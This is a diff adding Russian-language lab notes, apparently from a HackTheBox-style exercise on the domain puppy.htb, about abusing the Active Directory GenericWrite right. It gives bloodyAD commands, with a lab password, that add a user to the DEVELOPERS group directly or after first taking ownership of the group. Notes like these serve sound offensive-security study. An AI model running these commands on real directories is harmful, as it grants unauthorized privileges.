@@ -120,3 +120,13 @@ Silvercore_21
 
 # GenericWrite
 
+  добавляем себя в группу DEVELOPERS
+  bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.10.11.70 add groupMember 'DEVELOPERS' 'levi.james'
+
+   Иногда GenericWrite не даёт прямое добавление, но позволяет изменить владельца группы (через SetObjectOwner), а затем добавить себя:
+
+   # Шаг 1: Стать владельцем группы
+python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_IP> setObjectOwner 'DEVELOPERS' 'levi.james'
+
+# Шаг 2: Теперь добавить себя
+python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_IP> addGroupMember 'DEVELOPERS' 'levi.james'
